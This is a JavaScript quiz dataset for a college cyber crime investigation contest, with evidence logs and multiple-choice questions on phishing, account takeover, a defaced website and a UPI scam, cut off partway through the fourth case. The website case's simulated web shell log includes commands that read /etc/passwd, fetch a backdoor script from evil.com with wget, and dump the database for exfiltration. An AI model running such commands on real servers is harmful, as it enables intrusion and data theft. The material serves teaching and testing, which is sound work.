/**
 * TRACE × X — CYBER CRIME INVESTIGATION
 * ROUND 1 & ROUND 2 INVESTIGATION DATASET: 15 CASES
 * Evidence Dossiers & Exactly 15 Questions per Round (30 Questions Total per Case)
 * T.J.S. ENGINEERING COLLEGE | DEPARTMENT OF COMPUTER SCIENCE & ENGINEERING
 *
 * NOTE: STRICT CANDIDATE PRIVACY ENFORCED.
 * Authoritative answer keys and evaluation metrics reside exclusively in the backend SQLite database.
 */

'use strict';

const TRACE_INVESTIGATION_CASES = {
  "case-01": {
    "id": "case-01",
    "name": "CASE 01 — STOLEN SOCIAL MEDIA ACCOUNT",
    "summary": "A student's social media account has been taken over. Find how the attacker gained access.",
    "evidence": [
      {
        "tag": "ACCESS LOG",
        "time": "03:15:22 UTC",
        "title": "GEOLOCATION MISMATCH",
        "details": "Account login recorded from IP 194.26.29.112 (Frankfurt, Germany) using Linux/Chrome. The account owner was asleep in Chennai, India."
      },
      {
        "tag": "SECURITY EVENT",
        "time": "03:16:04 UTC",
        "title": "PASSWORD & RECOVERY CHANGE",
        "details": "Account password changed. Recovery email updated from student@college.edu to shadow_relay_99@proton.me. 2FA was not enabled."
      },
      {
        "tag": "DIRECT MESSAGE",
        "time": "Yesterday 18:40 UTC",
        "title": "SUSPICIOUS BADGE VERIFICATION DM",
        "details": "Victim received a message from '@Instagram_Verify_Help' stating: 'Your badge is ready. Click http://insta-badge-claim.xyz to secure your account within 24 hours.'"
      },
      {
        "tag": "BROWSER HISTORY",
        "time": "Yesterday 18:43 UTC",
        "title": "CREDENTIAL FORM ENTRY",
        "details": "Victim visited 'insta-badge-claim.xyz' and entered existing username and current password on an unverified web form."
      }
    ],
    "round2Evidence": [
      {
        "tag": "FORENSIC LOG",
        "time": "03:17:45 UTC",
        "title": "SESSION COOKIE EXFILTRATION",
        "details": "Web server logs demonstrate session cookie dumping. Cookie flag 'HttpOnly' was absent, allowing malicious client-side JavaScript from 'insta-badge-claim.xyz' to exfiltrate active session tokens."
      },
      {
        "tag": "DNS / WHOIS",
        "time": "03:18:10 UTC",
        "title": "BULLETPROOF HOSTING ASN TRACE",
        "details": "Reverse DNS query reveals 'insta-badge-claim.xyz' resolves to IP 194.26.29.112 assigned to a bulletproof hosting provider registered in Victoria, Seychelles with known C2 infrastructure."
      },
      {
        "tag": "OAUTH PERMISSION",
        "time": "03:18:40 UTC",
        "title": "PERSISTENCE VIA THIRD-PARTY APP",
        "details": "Attacker granted full API permissions to rogue application 'AnalyticsBoost_v2', enabling permanent read/write access to student DMs and contacts even after standard password change."
      },
      {
        "tag": "CREDENTIAL AUDIT",
        "time": "03:20:00 UTC",
        "title": "PASSWORD REUSE CORRELATION",
        "details": "Credential analysis shows the student used the identical password across their campus student portal, personal email, and social media, creating an immediate cross-account compromise risk."
      }
    ],
    "questions": [
      {
        "text": "What country did the unauthorized login originate from at 03:15 UTC?",
        "options": [
          "India",
          "Canada",
          "Japan",
          "Germany"
        ]
      },
      {
        "text": "Where was the actual account owner located at the time of the 03:15 UTC login?",
        "options": [
          "New York, USA",
          "London, UK",
          "Chennai, India",
          "Frankfurt, Germany"
        ]
      },
      {
        "text": "What new email address did the attacker change the account recovery to?",
        "options": [
          "support@meta.org",
          "shadow_relay_99@proton.me",
          "student@college.edu",
          "admin@instagram.com"
        ]
      },
      {
        "text": "What link did the suspicious direct message ask the student to click?",
        "options": [
          "http://insta-badge-claim.xyz",
          "https://meta.com/help",
          "https://instagram.com/verify",
          "http://college.edu/badge"
        ]
      },
      {
        "text": "What information did the student type on the unverified website form?",
        "options": [
          "Their home postal address",
          "Only their college roll number",
          "Their blood group",
          "Their username and current password"
        ]
      },
      {
        "text": "What critical security feature was NOT enabled on the student's social account?",
        "options": [
          "Dark mode theme",
          "Profile picture",
          "Two-Factor Authentication (2FA)",
          "Story archive"
        ]
      },
      {
        "text": "What username sent the fake badge verification direct message?",
        "options": [
          "@college_dean",
          "@Instagram_Verify_Help",
          "@support_desk",
          "@official_instagram"
        ]
      },
      {
        "text": "How much time did the fake message claim the user had to claim their badge?",
        "options": [
          "24 hours",
          "1 hour",
          "7 days",
          "30 minutes"
        ]
      },
      {
        "text": "Which operating system was recorded in the Frankfurt login access log?",
        "options": [
          "iOS",
          "Android",
          "Windows 11",
          "Linux"
        ]
      },
      {
        "text": "What was the student's original legitimate recovery email before it was modified?",
        "options": [
          "user@yahoo.com",
          "student@gmail.com",
          "student@college.edu",
          "shadow_relay_99@proton.me"
        ]
      },
      {
        "text": "Which browser was reported in the Frankfurt unauthorized login?",
        "options": [
          "Edge",
          "Chrome",
          "Firefox",
          "Safari"
        ]
      },
      {
        "text": "What kind of lure did the scammer use to trick the student into opening the link?",
        "options": [
          "A verified account badge offer",
          "A class exam timetable",
          "A flight discount coupon",
          "A lottery cash prize"
        ]
      },
      {
        "text": "What protocol was used in the scam link 'http://insta-badge-claim.xyz'?",
        "options": [
          "FTP",
          "Encrypted HTTPS",
          "SSH",
          "Insecure HTTP"
        ]
      },
      {
        "text": "Why was the 24-hour deadline in the message a major red flag?",
        "options": [
          "Verification badges are deleted every 24 hours by default",
          "Social platforms only send notifications on weekends",
          "It created false urgency to stop the victim from thinking critically",
          "Official badges always take at least 6 months to expire"
        ]
      },
      {
        "text": "Even before looking at IP logs, what detail in the URL alone proves it is not Instagram?",
        "options": [
          "It has more than three letters in the path",
          "The domain name is 'insta-badge-claim.xyz' instead of 'instagram.com'",
          "It was opened through a mobile browser",
          "It was typed in lowercase letters"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "What missing cookie security flag allowed client-side scripts to steal the session token?",
        "options": [
          "Secure",
          "SameSite",
          "HttpOnly",
          "Path"
        ]
      },
      {
        "text": "To which geographic jurisdiction was the bulletproof hosting provider registered?",
        "options": [
          "Frankfurt, Germany",
          "Victoria, Seychelles",
          "Chennai, India",
          "Panama City, Panama"
        ]
      },
      {
        "text": "What rogue application did the attacker authorize to maintain persistence after password change?",
        "options": [
          "AnalyticsBoost_v2",
          "InstaTracker_Free",
          "BadgeVerify_App",
          "SocialSecure_v1"
        ]
      },
      {
        "text": "Why would changing the social media password alone NOT remove the attacker's access?",
        "options": [
          "Passwords are only updated on servers once per week",
          "The student's Wi-Fi router was infected with firmware malware",
          "The attacker still owned the victim's physical smartphone",
          "The rogue third-party OAuth app retained persistent API read/write tokens"
        ]
      },
      {
        "text": "What major risk was identified during the student's credential audit?",
        "options": [
          "Using a password that contained more than 16 characters",
          "Storing passwords in an encrypted password manager",
          "Reusing the identical password across college portal, email, and social media",
          "Changing passwords on a monthly basis"
        ]
      },
      {
        "text": "How did the attacker gain knowledge of the student's password in the first place?",
        "options": [
          "By guessing the student's pet name",
          "The student voluntarily submitted it on the phishing web form",
          "By intercepting campus satellite signals",
          "By brute-forcing 10 million combinations over 3 days"
        ]
      },
      {
        "text": "What is the primary operational purpose of a 'bulletproof host' for cybercriminals?",
        "options": [
          "To ignore law enforcement take-down requests and abuse notices",
          "To offer free cloud backups for university students",
          "To automatically patch zero-day vulnerabilities",
          "To provide faster internet speeds for gamers"
        ]
      },
      {
        "text": "Why did the attacker change the account recovery email immediately upon gaining access?",
        "options": [
          "To reduce spam in the student's inbox",
          "To test if ProtonMail servers were active",
          "To share photos with other classmates",
          "To prevent the legitimate owner from triggering a password reset recovery"
        ]
      },
      {
        "text": "If 2FA had been enabled using an Authenticator App, how would it have affected the attacker at 03:15 UTC?",
        "options": [
          "The student's phone would automatically power off",
          "The password would be deleted from Instagram servers",
          "The login would be blocked because the attacker lacked the time-based OTP code",
          "The login would succeed because the attacker had the password"
        ]
      },
      {
        "text": "What correlation exists between the IP in the access log and the domain resolution in Round 2?",
        "options": [
          "The access log IP was in India while the domain IP was in Japan",
          "Both point to IP 194.26.29.112, connecting the phishing site to the Frankfurt login",
          "One is an IPv4 address while the other is an IPv6 address",
          "There is no correlation between the two records"
        ]
      },
      {
        "text": "Why is the use of ProtonMail by the attacker significant in this investigation?",
        "options": [
          "It provides end-to-end encryption and does not easily reveal user identity logs",
          "It only functions on Linux computers",
          "It automatically deletes sent emails after 10 seconds",
          "It is the official email service used by university staff"
        ]
      },
      {
        "text": "What step must the student take FIRST to prevent cross-account compromise?",
        "options": [
          "Purchase a new laptop",
          "Delete all photos from their phone gallery",
          "Turn off their Wi-Fi router for 48 hours",
          "Immediately change passwords on their campus portal and personal email"
        ]
      },
      {
        "text": "What does the 'HttpOnly' flag protect against when properly configured on session cookies?",
        "options": [
          "It encrypts the entire hard drive of the user's computer",
          "It blocks users from clicking hyperlinks",
          "It prevents client-side JavaScript from accessing 'document.cookie' during XSS attacks",
          "It forces all website images to load over HTTPS"
        ]
      },
      {
        "text": "Reconstructing the timeline, which event occurred FIRST in the attacker's chain of compromise?",
        "options": [
          "Authorizing the AnalyticsBoost_v2 application",
          "Sending the social engineering DM with the phishing link",
          "Changing the recovery email to ProtonMail",
          "Logging in from Frankfurt IP 194.26.29.112"
        ]
      },
      {
        "text": "What is the complete remediation checklist required to fully recover and secure this account?",
        "options": [
          "Reset password, restore recovery email, revoke OAuth app permissions, and enable 2FA",
          "Restart the computer and clear the browser cache once",
          "Simply change the password and leave all other settings unchanged",
          "Report the account as deleted and register a brand new account"
        ]
      }
    ]
  },
  "case-02": {
    "id": "case-02",
    "name": "CASE 02 — PHISHING EMAIL ATTACK",
    "summary": "A student receives a suspicious email asking for login details. Identify the clues that reveal the phishing attempt.",
    "evidence": [
      {
        "tag": "EMAIL HEADER",
        "time": "08:12:00 UTC",
        "title": "SPOOFED SENDER ADDRESS",
        "details": "Display name: 'College Admin Portal'. Actual sender header: 'service-notice@tjs-college-verify.co.vu'. The official college domain is 'tjs.edu.in'."
      },
      {
        "tag": "EMAIL BODY",
        "time": "08:12:00 UTC",
        "title": "URGENT THREAT NOTICE",
        "details": "'URGENT: Your student portal access will be permanently terminated in 3 hours unless you confirm your password immediately.'"
      },
      {
        "tag": "HYPERLINK TRACE",
        "time": "08:14:15 UTC",
        "title": "MISMATCHED DESTINATION URL",
        "details": "Button text: 'Verify Student Portal'. Hyperlink target: 'http://172.67.182.20/portal-login/index.php'. Notice the non-HTTPS plain IP address."
      },
      {
        "tag": "ATTACHMENT SCAN",
        "time": "08:15:20 UTC",
        "title": "ATTACHED HTML FILE",
        "details": "File attached: 'Account_Verification_Form.html'. Contains obfuscated JavaScript designed to transmit submitted form data to an external server."
      }
    ],
    "round2Evidence": [
      {
        "tag": "EMAIL HEADER",
        "time": "08:14:12 UTC",
        "title": "SPF, DKIM & DMARC MISALIGNMENT",
        "details": "Header analysis reveals 'Received-SPF: softfail (~all)', 'DKIM-Signature: d=spoof-mailer.biz (fail)', and 'DMARC: p=quarantine'. The visible sender claimed to be 'admin@college.edu'."
      },
      {
        "tag": "SMTP RELAY",
        "time": "08:14:15 UTC",
        "title": "OPEN RELAY HOP DISCOVERY",
        "details": "Hop tracking demonstrates the email originated from an insecure open SMTP relay at IP 200.147.35.12 located in Brazil, bypassing college campus mail submission filters."
      },
      {
        "tag": "ATTACHMENT",
        "time": "08:15:00 UTC",
        "title": "OBFUSCATED HTML SMUGGLING",
        "details": "Attachment 'Fee_Statement_2026.html' contains an embedded Base64-encoded JavaScript blob utilizing 'unescape()' and Blob URL generation to reconstruct a credential harvester offline."
      },
      {
        "tag": "DNS / MX",
        "time": "08:16:30 UTC",
        "title": "LOOKALIKE HOMOGLYPH DOMAIN",
        "details": "Target URL embedded in the HTML file resolves to 'cоllege.edu' utilizing Cyrillic small letter 'о' (U+043E), creating a visually indistinguishable homoglyph domain."
      }
    ],
    "questions": [
      {
        "text": "What is the official email domain of the college according to the evidence?",
        "options": [
          "verify-portal.net",
          "tjs-college-verify.co.vu",
          "tjs.edu.in",
          "college-admin.com"
        ]
      },
      {
        "text": "What fake sender address was found in the email header?",
        "options": [
          "helpdesk@college.ac.in",
          "service-notice@tjs-college-verify.co.vu",
          "admin@tjs.edu.in",
          "principal@tjs.edu.in"
        ]
      },
      {
        "text": "What time limit did the phishing email threaten before portal termination?",
        "options": [
          "3 hours",
          "7 days",
          "10 minutes",
          "24 hours"
        ]
      },
      {
        "text": "What was the label text written on the button inside the email?",
        "options": [
          "Download Marks",
          "View Timetable",
          "Pay Semester Fee",
          "Verify Student Portal"
        ]
      },
      {
        "text": "What was the actual destination link behind the 'Verify Student Portal' button?",
        "options": [
          "http://college.edu/home",
          "https://google.com/login",
          "http://172.67.182.20/portal-login/index.php",
          "https://tjs.edu.in/portal"
        ]
      },
      {
        "text": "What file was attached directly to the phishing email?",
        "options": [
          "exam_results.xlsx",
          "Account_Verification_Form.html",
          "syllabus_2026.pdf",
          "college_photo.jpg"
        ]
      },
      {
        "text": "What did the attached HTML file contain according to the scanner?",
        "options": [
          "Obfuscated JavaScript to steal submitted form data",
          "A spreadsheet of library books",
          "An audio recording of a lecture",
          "A clean university academic calendar"
        ]
      },
      {
        "text": "Why is an IP address like '172.67.182.20' suspicious in a college login link?",
        "options": [
          "All numbers in URLs are automatically blocked by the government",
          "IP addresses are only used for gaming consoles",
          "IP addresses cannot display web pages",
          "Official college portals use secure domain names with HTTPS, not raw IP addresses"
        ]
      },
      {
        "text": "What display name did the attacker configure to look legitimate?",
        "options": [
          "Bank Branch Manager",
          "Google Security Team",
          "College Admin Portal",
          "Campus Sports Club"
        ]
      },
      {
        "text": "What psychological emotion does the email exploit by threatening 3-hour termination?",
        "options": [
          "Happiness and excitement",
          "Panic and fear of losing portal access",
          "Curiosity about sports",
          "Patience and relaxation"
        ]
      },
      {
        "text": "What top-level domain ending did the fake sender domain use?",
        "options": [
          ".co.vu",
          ".ac.in",
          ".edu.in",
          ".gov.in"
        ]
      },
      {
        "text": "Which security protocol is noticeably absent in 'http://172.67.182.20'?",
        "options": [
          "Wi-Fi Direct",
          "Bluetooth",
          "HDMI",
          "HTTPS encryption (SSL/TLS)"
        ]
      },
      {
        "text": "What action should a student take upon receiving an email asking for passwords?",
        "options": [
          "Forward the email to all friends asking them to verify",
          "Immediately reply with their password to be safe",
          "Never enter passwords; report the email to the college IT department",
          "Click the link on three different devices"
        ]
      },
      {
        "text": "Why do phishing emails often attach an HTML file instead of hosting a web link?",
        "options": [
          "Because HTML files can only be opened on supercomputers",
          "To evade network web filters and run the malicious form locally in the victim's browser",
          "Because attachments guarantee the email is free of viruses",
          "To save storage space on the college mail server"
        ]
      },
      {
        "text": "What is the primary indicator that 'College Admin Portal' is not the true sender?",
        "options": [
          "The underlying email address header does not match the official college domain",
          "The email was sent to multiple recipients",
          "The email had a subject line in English",
          "The email was received during morning hours"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "What did the SPF authentication check return in the email header analysis?",
        "options": [
          "none",
          "softfail (~all)",
          "temperror",
          "pass"
        ]
      },
      {
        "text": "In which country was the insecure open SMTP relay located?",
        "options": [
          "Brazil",
          "Russia",
          "India",
          "Germany"
        ]
      },
      {
        "text": "What technique was used in 'Fee_Statement_2026.html' to construct the harvester offline?",
        "options": [
          "SQL Injection",
          "Buffer Overflow",
          "Cross-Site Request Forgery",
          "HTML Smuggling via Base64 blob decoding"
        ]
      },
      {
        "text": "What specific Unicode character trick was employed in the lookalike homoglyph domain?",
        "options": [
          "Greek capital Omega replacing 'O'",
          "Emoji icon replacing the dot",
          "Cyrillic small letter 'о' (U+043E) replacing Latin 'o'",
          "Arabic numeral '0' replacing letter 'O'"
        ]
      },
      {
        "text": "What DMARC policy was published by the victim domain according to the header?",
        "options": [
          "p=none",
          "p=quarantine",
          "p=disable",
          "p=reject"
        ]
      },
      {
        "text": "Why did the attacker route the email through an open SMTP relay in Brazil?",
        "options": [
          "To obscure the real sender IP and bypass reputation filters",
          "Because college emails can only be sent from South America",
          "Because Brazilian servers have lower electricity costs",
          "To translate the email into Portuguese"
        ]
      },
      {
        "text": "What is the primary danger of homoglyph domain attacks (IDN homograph attacks)?",
        "options": [
          "They crash the user's internet modem instantly",
          "They prevent search engines from working",
          "They only work on mobile phones",
          "They look visually identical to trusted domain names in modern browser address bars"
        ]
      },
      {
        "text": "What function does HTML smuggling serve in bypassing corporate email security gateways?",
        "options": [
          "It encrypts the entire email gateway hard disk",
          "It physically unplugs the gateway firewall",
          "The payload is generated dynamically inside the browser, avoiding static gateway signatures",
          "It transforms the email into a PDF document"
        ]
      },
      {
        "text": "Why did DKIM verification fail with 'd=spoof-mailer.biz'?",
        "options": [
          "The college mail server was powered off",
          "The cryptographic signature domain did not match the claimed sender domain",
          "The student had not installed the DKIM software on their laptop",
          "The email was sent without any text in the body"
        ]
      },
      {
        "text": "If the college DMARC policy had been set to 'p=reject' instead of 'p=quarantine', what would have happened?",
        "options": [
          "The receiving mail server would outright drop the email, preventing delivery to the student",
          "The email would still be delivered straight to the Primary Inbox",
          "All college email accounts would be suspended",
          "The attacker would receive an automated apology email"
        ]
      },
      {
        "text": "What is the role of the Base64 encoding used inside the attached HTML file?",
        "options": [
          "To compress the file size so it fits on a floppy disk",
          "To speed up the student's internet connection",
          "To make the web page display in colorful fonts",
          "To hide malicious code from simple text-matching antivirus scanners"
        ]
      },
      {
        "text": "Which email authentication record is explicitly published in the domain DNS to list authorized sending IPs?",
        "options": [
          "A Record",
          "CNAME",
          "SPF (Sender Policy Framework)",
          "PTR"
        ]
      },
      {
        "text": "How can an email client or browser protect users against homoglyph attacks?",
        "options": [
          "By blocking all websites registered on Tuesdays",
          "By displaying internationalized domains in Punycode format (e.g., 'xn--...')",
          "By converting all incoming emails to black-and-white text",
          "By disabling DNS resolution completely"
        ]
      },
      {
        "text": "Analyzing the combined email headers, what three authentication failures definitively prove email spoofing?",
        "options": [
          "SPF softfail, DKIM domain mismatch (spoof-mailer.biz), and DMARC alignment failure",
          "Missing subject line, missing date, and missing attachment",
          "Plain text encoding, English language, and standard font size",
          "Sender used Gmail, receiver used Outlook, and delivery took 2 seconds"
        ]
      },
      {
        "text": "What is the most effective architectural defense for the college IT team to prevent future spoofing of their domain?",
        "options": [
          "Block all emails containing the word 'urgent'",
          "Change the college website background color to red",
          "Ask all students to stop reading emails on mobile devices",
          "Enforce strict DMARC 'p=reject' policy with 100% DKIM and SPF alignment"
        ]
      }
    ]
  },
  "case-03": {
    "id": "case-03",
    "name": "CASE 03 — HACKED COLLEGE WEBSITE",
    "summary": "The college website has been changed without permission. Investigate the evidence to understand how access was gained.",
    "evidence": [
      {
        "tag": "WEBSITE DEFACEMENT",
        "time": "02:10:00 UTC",
        "title": "HOME PAGE DEFACED",
        "details": "Homepage 'index.html' replaced with banner: 'HACKED BY GHOST_SEC'. News feed articles deleted."
      },
      {
        "tag": "WEB SERVER LOG",
        "time": "01:55:12 UTC",
        "title": "CMS ADMIN PORTAL BRUTE FORCE",
        "details": "Over 4,500 POST requests to '/admin/login.php' from IP 45.142.122.9 in 10 minutes. Final request returned HTTP 200 (Success) for username 'admin'."
      },
      {
        "tag": "CONFIG AUDIT",
        "time": "02:25:00 UTC",
        "title": "DEFAULT CREDENTIALS FOUND",
        "details": "Web CMS administrator account had password set to 'admin123'. Account had not enforced rate limiting or account lockout."
      },
      {
        "tag": "FILE UPLOAD LOG",
        "time": "02:02:40 UTC",
        "title": "WEB SHELL UPLOAD",
        "details": "File 'gallery_photo.php' uploaded via the unauthenticated image upload endpoint in the student gallery plugin."
      }
    ],
    "round2Evidence": [
      {
        "tag": "APACHE ACCESS LOG",
        "time": "02:04:15 UTC",
        "title": "WEB SHELL COMMAND EXECUTION",
        "details": "HTTP GET requests to '/uploads/gallery_photo.php?cmd=whoami' returned 'www-data'. Followed by '?cmd=cat%20/etc/passwd' and '?cmd=wget%20http://evil.com/backdoor.sh'."
      },
      {
        "tag": "FILE INTEGRITY",
        "time": "02:08:30 UTC",
        "title": "HTACCESS REDIRECTION TAMPER",
        "details": ".htaccess file overwritten with RewriteRule redirecting all incoming student traffic on mobile devices to a fraudulent ad-revenue network."
      },
      {
        "tag": "DATABASE DUMP",
        "time": "02:06:50 UTC",
        "title": "MYSQL DUMP EXFILTRATION",
        "details": "Execution of 'mysqldump -u root -p college_portal > /var/www/html/backup.sql' followed by outbound HTTP download to adversary IP 45.142.122.9."
      },
      {
        "tag": "PERMISSION AUDIT",
        "time": "02:28:00 UTC",
        "title": "OVERLY PERMISSIVE DIRECTORY",
        "details": "Directory '/var/www/html/uploads' had full 777 read-write-execute permissions and lacked PHP execution restrictions in Apache virtual host configuration."
      }
    ],
    "questions": [
      {
        "text": "What message was displayed on the defaced college homepage?",
        "options": [
          "SERVER UNDER MAINTENANCE",
          "HACKED BY GHOST_SEC",
          "EXAM POSTPONED",
          "WELCOME FRESHERS"
        ]
      },
      {
        "text": "What weak password was discovered on the CMS administrator account?",
        "options": [
          "admin123",
          "college_secure",
          "admin!@#",
          "P@ssw0rd2026"
        ]
      },
      {
        "text": "How many login attempts were launched against '/admin/login.php' in 10 minutes?",
        "options": [
          "Only 2",
          "50,000",
          "Exactly 10",
          "Over 4,500"
        ]
      },
      {
        "text": "What malicious file was uploaded through the student gallery plugin?",
        "options": [
          "exam_hall.jpg",
          "logo.png",
          "gallery_photo.php",
          "student_id.pdf"
        ]
      },
      {
        "text": "What IP address carried out the brute force attack on the admin portal?",
        "options": [
          "10.0.0.1",
          "45.142.122.9",
          "192.168.1.1",
          "127.0.0.1"
        ]
      },
      {
        "text": "What critical security defense was missing on the login portal to stop thousands of rapid attempts?",
        "options": [
          "Rate limiting or account lockout",
          "A blue background theme",
          "An email newsletter signup",
          "A student feedback form"
        ]
      },
      {
        "text": "Which endpoint in the student gallery plugin was exploited by the attacker?",
        "options": [
          "Contact Us form",
          "Campus map viewer",
          "Library book search",
          "Unauthenticated image upload endpoint"
        ]
      },
      {
        "text": "What HTTP status code indicated that the attacker successfully logged in?",
        "options": [
          "HTTP 404 (Not Found)",
          "HTTP 500 (Internal Error)",
          "HTTP 200 (Success)",
          "HTTP 403 (Forbidden)"
        ]
      },
      {
        "text": "Which file was defaced to alter the look of the website homepage?",
        "options": [
          "contact.php",
          "index.html",
          "styles.css",
          "about.html"
        ]
      },
      {
        "text": "What type of attack involves repeatedly guessing passwords until the correct one is found?",
        "options": [
          "Brute Force attack",
          "Phishing attack",
          "SQL Injection",
          "Denial of Service attack"
        ]
      },
      {
        "text": "Why is uploading a file ending in '.php' instead of '.jpg' to an image gallery dangerous?",
        "options": [
          "PHP files take up 100 times more storage space",
          "A PHP file cannot be viewed on mobile phones",
          "PHP files automatically delete user mouse drivers",
          "A PHP file can be executed by the web server to run arbitrary attacker commands"
        ]
      },
      {
        "text": "What username was targeted by the brute force attack in the server logs?",
        "options": [
          "student",
          "teacher",
          "admin",
          "guest"
        ]
      },
      {
        "text": "What should the system administrator change immediately after regaining control?",
        "options": [
          "The college logo",
          "The default administrator password to a strong, unique password",
          "The keyboard font",
          "The monitor brightness"
        ]
      },
      {
        "text": "Why did the image upload feature accept a '.php' file in the first place?",
        "options": [
          "The backend code lacked file extension and MIME type validation",
          "The website was hosted on a Linux computer",
          "The server ran out of hard disk memory",
          "The PHP file was smaller than 10 kilobytes"
        ]
      },
      {
        "text": "What distinguishes website defacement from a purely silent data theft attack?",
        "options": [
          "Defacement always destroys the physical server hardware",
          "Defacement only affects web browsers on Apple devices",
          "Defacement requires physical access to the college server room",
          "Defacement is intentionally public and visible to cause reputational damage"
        ]
      }
    ],
    "round2Questions": [
      {
        "text": "What operating system user account was revealed by the 'whoami' command in the web shell?",
        "options": [
          "www-data",
          "admin",
          "root",
          "student"
        ]
      },
      {
        "text": "What command did the attacker execute to extract the full database into a publicly downloadable file?",
        "options": [
          "export db college_portal to file",
          "tar -czvf database.tar.gz /var/lib/mysql",
          "sqlmap -u http://college.edu --dump",
          "mysqldump -u root -p college_portal > /var/www/html/backup.sql"
        ]
      },
      {
        "text": "What file was modified to silently redirect mobile visitors to a fraudulent ad network?",
        "options": [
          "robots.txt",
          "php.ini",
          ".htaccess",
          "web.config"
        ]
      },
      {
        "text": "What permissions were assigned to the '/var/www/html/uploads' directory?",
        "options": [
          "644",
          "777 (Read, Write, Execute for all)",
          "755",
          "400"
        ]
      },
      {
        "text": "Why was the attacker able to download the database dump directly over HTTP?",
        "options": [
          "The dump was saved in the public web root directory '/var/www/html/'",
          "MySQL ports are open to web browsers by default",
          "The college firewall was disconnected from the wall",
          "The database was encrypted with an open key"
        ]
      },
      {
        "text": "What parameter in the URL allowed the attacker to pass arbitrary terminal commands to the web shell?",
        "options": [
          "?id=",
          "?page=",
          "?search=",
          "?cmd="
        ]
      },
      {
        "text": "What configuration setting in Apache would have prevented PHP execution inside the uploads folder?",
        "options": [
          "ServerTokens Prod",
          "KeepAlive On",
          "php_admin_flag engine off (or RemoveHandler .php)",
          "MaxClients 150"
        ]
      },
      {
        "text": "What secondary payload did the attacker attempt to download using 'wget'?",
        "options": [
          "http://college.edu/fix.sh",
          "http://evil.com/backdoor.sh",
          "http://github.com/patch.sh",
          "http://google.com/search"
        ]
      },
      {
        "text": "What is the primary risk of running the web server process as 'www-data' without chroot or container isolation?",
        "options": [
          "A web shell can read sensitive files accessible to web group and explore system utilities",
          "The website cannot connect to the internet",
          "The entire computer will shut down automatically",
          "Only administrators can visit the website"
        ]
      },
      {
        "text": "Why is an account lockout policy of 5 failed attempts crucial against brute force attacks?",
        "options": [
          "It automatically emails the attacker's home address to police",
          "It saves battery power on the user's laptop",
          "It makes the website load faster for legitimate visitors",
          "It stops automated tools from testing thousands of passwords per minute"
        ]
      },
      {
        "text": "How did the attacker pivot from application-level access to system-level command execution?",
        "options": [
          "By sending an email to the college principal",
          "By clicking the Refresh button on the defaced homepage",
          "By uploading and invoking a PHP web shell containing system execution functions like 'shell_exec()'",
          "By connecting an external USB drive to the server"
        ]
      },
      {
        "text": "What file integrity monitoring (FIM) tool alert would have immediately caught the homepage alteration?",
        "options": [
          "A warning that RAM usage is below 10%",
          "An alert detecting an unauthorized hash change on 'index.html' and '.htaccess'",
          "An alert monitoring CPU temperature",
          "A notification about a full printer queue"
        ]
      },
      {
        "text": "Why should database credentials never be stored in plaintext inside web application configuration files?",
        "options": [
          "Any web shell that reads web application files can immediately compromise the backend database",
          "Plaintext files cannot be opened on Linux systems",
          "Database passwords only work when stored in audio format",
          "Plaintext files take twice as long for computers to read"
        ]
      },
      {
        "text": "Reconstructing the attacker's kill chain, what is the exact chronological order of exploitation?",
        "options": [
          "Dump DB -> Overwrite homepage -> Brute force admin portal -> Upload web shell",
          "Overwrite homepage -> Dump DB -> Upload web shell -> Brute force admin portal",
          "Execute commands -> Overwrite .htaccess -> Brute force admin portal -> Upload web shell",
          "Brute force admin portal -> Upload web shell -> Execute commands & dump DB -> Overwrite homepage & .htaccess"
        ]
      },
      {
        "text": "What is the complete defense-in-depth strategy to permanently secure this web application?",
        "options": [
          "Restarting the Apache server every 4 hours",
          "Deleting all images from the gallery plugin",
          "Strict input/upload validation, directory execution disablement, MFA on admin login, and database isolation",
          "Only changing the homepage background image"
        ]
      }
    ]
  },
  "case-04": {
    "id": "case-04",
    "name": "CASE 04 — FAKE ONLINE PAYMENT",
    "summary": "A student loses money after a suspicious online transaction. Trace the evidence and identify the fraud.",
    "evidence": [
      {
        "tag": "PAYMENT RECORD",
        "time": "14:22:10 UTC",
        "title": "UNAUTHORIZED UPI TRANSFER",
        "details": "Student transferred ₹4,500 to VPA 'quick_refund_desk@ybl' believing it was a college canteen rebate refund."
      },
      {
        "tag": "CHAT LOG",
        "time": "14:18:00 UTC",
        "title": "REVERSE QR CODE SCAM",
        "details": "Scammer claimed: 'Scan this QR code and enter your UPI PIN to RECEIVE your ₹4,500 cash rebate.'"
      },
      {
        "tag": "TRANSACTION RECEIPT",
        "time": "14:23:05 UTC",
        "title": "DEBIT CONFIRMATION",
        "details": "Bank SMS: 'A/c XX409 debited by Rs. 4,500 to quick_refund_desk. Available balance Rs. 210. Never share UPI PIN.'"
      },
      {
        "tag": "CALL RECORD",
        "time": "14:15:30 UTC",
        "title": "SPOOFED SUPPORT CALL",
        "details": "Caller claimed to be 'State Bank Payment Desk' using an unverified mobile number +91 98765 00000."
      }
    ],
    "round2Evidence": [
      {
        "tag": "UPI INTENT LOG",
        "time": "14:21:45 UTC",
        "title": "COLLECT REQUEST MANIPULATION",
        "details": "The scam QR code encoded a UPI Collect / Pay intent: 'upi://pay?pa=quick_refund_desk@ybl&am=4500&pn=RebateRefund'. The parameter 'am=4500' set an automatic debit amount instead of a credit."
      },
      {
        "tag": "MONEY TRAIL",
        "time": "14:25:12 UTC",
        "title": "INSTANT MULTI-WALLET CASHOUT",
        "details": "Within 3 minutes of receipt, ₹4,500 was split across three prepaid digital wallets and cashed out at an off-grid ATM in another state."
      },
      {
        "tag": "CALL LOG TELEMETRY",
        "time": "14:14:00 UTC",
        "title": "VOIP SPOOFED CALLER ID",
        "details": "Telecom switch trace proves +91 98765 00000 was generated via an offshore SIP VoIP service provider without genuine SIM IMSI registration."
      },
      {
        "tag": "DEVICE AUDIT",
        "time": "14:20:10 UTC",
        "title": "SCREEN SHARE APP DETECTION",
        "details": "Scammer persuaded student to install 'QuickSupport' utility prior to the transaction, allowing real-time viewing of bank balance and OTP prompts."
      }
    ],
    "questions": [
      {
        "text": "How much money was debited from the student's account?",
        "options": [
          "₹4,500",
          "₹10,000",
          "₹1,000",
          "₹500"
        ]
      },
      {
        "text": "What Virtual Payment Address (VPA) received the fraudulent transfer?",
        "options": [
          "admin@axis",
          "college_canteen@sbi",
          "refund_official@icici",
          "quick_refund_desk@ybl"
        ]
      },
      {
        "text": "What fundamental rule of UPI did the scammer violate when asking for the PIN?",
        "options": [
          "UPI PIN is shared with the caller for verification",
          "UPI PIN is required for all incoming transactions",
          "You NEVER need to enter your UPI PIN to receive money",
